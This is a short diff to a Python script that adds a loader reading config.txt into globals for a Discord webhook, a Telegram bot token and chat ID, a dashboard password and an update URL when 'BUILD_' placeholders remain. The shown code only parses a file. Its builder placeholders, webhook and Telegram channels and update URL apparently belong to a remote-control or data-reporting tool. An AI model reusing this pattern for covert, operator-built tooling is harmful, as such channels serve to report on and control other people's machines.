@@ -27,6 +27,41 @@ import random
 import socket
 import subprocess
 import sys
+
+# Runtime config loader - reads config.txt if BUILD_ placeholders detected
+def _load_runtime_config():
+    """Read config.txt at runtime if BUILD_ placeholders are still present (for testing without build)."""
+    global DISCORD_WEBHOOK_URL, DISCORD_USERNAME, DASHBOARD_PASSWORD
+    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, UPDATE_URL
+    if not any(v.startswith("BUILD_") for v in [DISCORD_WEBHOOK_URL, DASHBOARD_PASSWORD, TELEGRAM_BOT_TOKEN]):
+        return
+    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.txt")
+    if not os.path.exists(config_path):
+        return
+    mapping = {
+        "DISCORD_WEBHOOK": "DISCORD_WEBHOOK_URL",
+        "DISCORD_USERNAME": "DISCORD_USERNAME",
+        "DASHBOARD_PASSWORD": "DASHBOARD_PASSWORD",
+        "TELEGRAM_BOT_TOKEN": "TELEGRAM_BOT_TOKEN",
+        "TELEGRAM_CHAT_ID": "TELEGRAM_CHAT_ID",
+        "UPDATE_URL": "UPDATE_URL",
+    }
+    try:
+        with open(config_path, 'r', encoding='utf-8') as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith('#'):
+                    continue
+                if '=' in line:
+                    key, val = line.split('=', 1)
+                    key = key.strip()
+                    val = val.strip()
+                    if key in mapping:
+                        globals()[mapping[key]] = val
+    except:
+        pass
+
+_load_runtime_config()
 import time
 import base64
 import threading
